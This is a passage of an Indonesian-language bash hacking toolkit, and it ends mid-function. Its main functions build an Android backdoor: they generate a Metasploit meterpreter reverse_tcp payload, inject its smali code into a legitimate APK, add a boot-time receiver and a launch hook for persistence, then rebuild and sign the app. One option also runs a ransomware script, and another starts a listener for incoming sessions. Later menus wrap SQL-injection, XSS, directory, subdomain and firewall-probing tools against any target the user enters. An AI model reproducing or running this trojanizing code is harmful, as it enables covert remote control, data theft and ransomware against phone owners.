        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle piscart pro please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d piscart.apk

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle piscart pro please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr piscart/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit piscart/smali/com/metasploit

        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild piscart pro please wait\033[31;1m\n"

        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b piscart -o malware.apk
        rm -fr picsart.apk piscart payload payload.apk

}

# fungsi ubah nama Backdoor
#
function rename_Backdoor(){
read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor : "'\033[34;1m')" new
printf '\033[31;1m'
cd $path/Malware && mv malware.apk $new.apk
echo
sleep 0.025
printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil diubah menjadi ~>\033[31;1m $new\n"
printf '\033[31;1m'
echo
sleep 3
}

# fungsi apus data sampah
#
function clear_data(){
        rm -fr ori.apk payload payload.apk original && mv $nama.apk Malware
}

# fix java sudo apktool, and sign
#
#_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
# Backdoor buat inject
#
function inject_payload(){
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
}

# fungsi get aplikasi web GUI
#
function xyz()
{
 orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
}

# Decompyle payload
#
function decompile_payload(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompile Payload\033[31;1m\n"
        spiner
        echo
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d -f $path/payload.apk
        spiner
        echo
}

# decompile original
#
function decompile_original(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompile Original\033[31;1m\n"
        spiner
        echo
        sudo apktool d -f -o $path/original $orig
        spiner
        echo
}

# Rebuild payload original
#
function Rebuild_original(){
	printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild Backdoor please wait\033[31;1m\n"
        spiner
        echo
        sudo apktool b $path/original -o ori.apk
        spiner
        echo
}

# add permission dan hook
#
function perms()
{
 printf $ku""
 printf "\033[37;1m[\033[32;1m*\033[37;1m] menambahkan permission and hook smali\033[31;1m\n"
 spiner
 echo
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 android_nam=$tmp
}

# functions hook smali
#
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali : $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    printf '\033[31;1m'
    spiner
    printf "\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan : $android_activity.smali\n"
    printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
    spiner
    sleep 2
    echo
    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    printf "\033[37;1minject Smali : $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    printf "\033[37;1mbaris ke : $hook_num \n"
    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}

# fungsi android user input Backdoor file
#
function Backdoor_file(){
        sets_original
        inject_payload
        xyz
        decompile_payload
        decompile_original
        perms
        hook_smalies
        sleep 1
        Rebuild_original
        sleep 1
        sign_orig
        sleep 1
        clear_data
        sleep 1
}

function Backdoor_ransomware() {
	#statements
	clear
	baner
	echo
	echo
	pt=".data/ransomware"
	cd $pt;python3 ransomware.py;cd ../..
	sleep 5
	sets_original
	inject_payload
	xyz
	decompile_payload
	decompile_original
	perms
	hook_smalies
	sleep 1
	Rebuild_original
	sleep 1
	sign_orig
	sleep 1
	clear_data
	sleep 1
}

# listerner metasploit
function listerners(){
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1mx\033[31;1m] \033[37;1mkembali\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    listener_kali
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	clear
	listerners

	elif [ $xyz = "x"  ];
	then
	run_metasploit

	else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	listerners

	fi
}

function run_metasploit(){
        clear
        baner
        echo
        metasploit
                if [ $xyz = "1"  ];
                then
                android
                run_metasploit

                elif [ $xyz = "2"  ];
                then
                clear
                baner
                echo
                listerners
                run_metasploit

                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_metasploit

                fi
}


# web attack - sql injection
function sqli(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall sql-injection\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun sql-injection\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/sql-injection ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msql-injection already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                echo
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sql-injection \033[31;1mnot found\033[37;1m, installing sql-injection!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/K1M4K-ID/sql-injection > /dev/null 2>&1
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2
                fi

        cd $path/.data/sql-injection;bash sql-injection.sh
        sqli
        sleep 2

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/sql-injection ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msql-injection already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					echo
					sleep 2
					clear
					else
                                        echo
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sql-injection \033[31;1mnot found\033[37;1m, installing sql-injection!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/K1M4K-ID/sql-injection > /dev/null 2>&1
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					echo
                                        sleep 2
					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
        cd $path/.data/sql-injection;bash sql-injection.sh
        sleep 3
        sqli

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        sqli
        fi
}

# web attack - xss
function xss(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall XSS\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun XSS\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/xss ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mxss already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                echo
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m xss \033[31;1mnot found\033[37;1m, installing xss!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/K1M4K-ID/xss > /dev/null 2>&1
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2
                fi

        cd $path/.data/xss;python3 payloader.py
        xss
        sleep 2

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/xss ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mxss already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					echo
					sleep 2
					clear
					else
                                        echo
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m xss \033[31;1mnot found\033[37;1m, installing xss!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/K1M4K-ID/xss > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					echo
                                        sleep 2
					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
	sleep 2
	clear
        cd $path/.data/xss;python3 payloader.py
        sleep 3
        xss

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        xss
        fi
}

function exec_dirsearch1(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> detik.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	dirsearch -u $target
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_dirsearch2

	else [ $scan != "y" ]
	dirsec
	fi
	done
}

function exec_dirsearch2(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> detik.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m extension pisah dengan , >> php,js,html\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] ext : "'\033[34;1m')" ext
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	dirsearch -e $ext -u $target -r -R 3
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_dirsearch2

	else [ $scan != "y" ]
	dirsec
	fi
	done
}

# web attack - dirsearch
function dirsec(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall dirsearch\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun dirsearch\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/dirsearch ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mdirsearch already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m dirsearch \033[31;1mnot found\033[37;1m, installing dirsearch!\n"
                apt-get install dirsearch -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mbasic scanning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mscanning with extension\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    sleep 2
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_dirsearch1
	   	elif [[ $xyz = "2" ]];
	   	then
	   		exec_dirsearch2
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m dirsearch \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   
	    	
	    	

        elif [ $xyz = "2"  ];
        then
		if [[ -f /usr/bin/dirsearch ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mdirsearch already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m dirsearch \033[31;1mnot found\033[37;1m, installing dirsearch!\n"
                apt-get install dirsearch -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
                
            baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mbasic scanning\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mscanning with extension\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_dirsearch1
	   	elif [[ $xyz = "2" ]];
	   	then
	   		exec_dirsearch2
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m dirsearch \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        dirsec
        fi
}

function exec_sublist3r1(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	sublist3r -v -d $target
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_sublist3r1

	else [ $scan != "y" ]
	subdomain
	fi
	done
}

function exec_sublist3r2(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m port 80,443 pisah dengan , >> 80,443\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url  : "'\033[34;1m')" target
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] port : "'\033[34;1m')" pots
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	sublist3r -v -d $target -p $pots
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_sublist3r2

	else [ $scan != "y" ]
	subdomain
	fi
	done
}

# web attack - subdomain
function subdomain(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall sublist3r\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun sublist3r\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/sublist3r ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msublist3r already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                echo
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sublist3r \033[31;1mnot found\033[37;1m, installing sublist3r!\n"
                apt-get install sublist3r -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2
                clear

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1menumerate subdomains of specific domain\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1menumerate subdomains of specific domain and show the results in realtime\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_sublist3r1
	   	elif [[ $xyz = "2" ]];
	   	then
	   		exec_sublist3r2
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m sublist3r \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   
	    	
	    	

        elif [ $xyz = "2"  ];
        then
		if [[ -f /usr/bin/sublist3r ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msublist3r already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sublist3r \033[31;1mnot found\033[37;1m, installing sublist3r	!\n"
                apt-get install sublist3r -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
                
            baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1menumerate subdomains of specific domain\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1menumerate subdomains of specific domain and show the results in realtime\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
	    echo
	   	if [[ $xyz = "1" ]];
	   	then
	   		exec_sublist3r1
	   	elif [[ $xyz = "2" ]];
	   	then
	   		exec_sublist3r2
	   	else
	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m sublist3r \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
	   		sleep 2
	   	fi
	   

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        subdomain
        fi
}

function exec_wafw00f(){
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
	sleep 0.025
	echo
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> kompas.com\n"
	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url  : "'\033[34;1m')" target
	printf '\033[31;1m'
	printf '\033[37;1m'
	echo
	wafw00f $target
	sleep 0.025
        sleep 3
	printf '\033[31;1m'
	echo
	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
	echo
	while true
	do
	if [ $scan = "y"  ];
	then
	exec_wafw00f

	else [ $scan != "y" ]
	wafwoof
	fi
	done
}

# firewall chekking - wafw00f
function wafwoof(){
    clear
    baner
    echo
    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall wafw00f\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun wafw00f\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/wafw00f ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwafw00f already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wafw00f \033[31;1mnot found\033[37;1m, installing wafw00f!\n"
                apt-get install wafw00f -y &> /dev/null
		sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo
                sleep 2

                fi
	    baner
	    echo
	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mchecking firewall\033[31;1m\n"
	    sleep 0.025
	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
	    sleep 0.025
	    echo
	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
	    sleep 0.025
	    printf '\033[31;1m'
	    echo
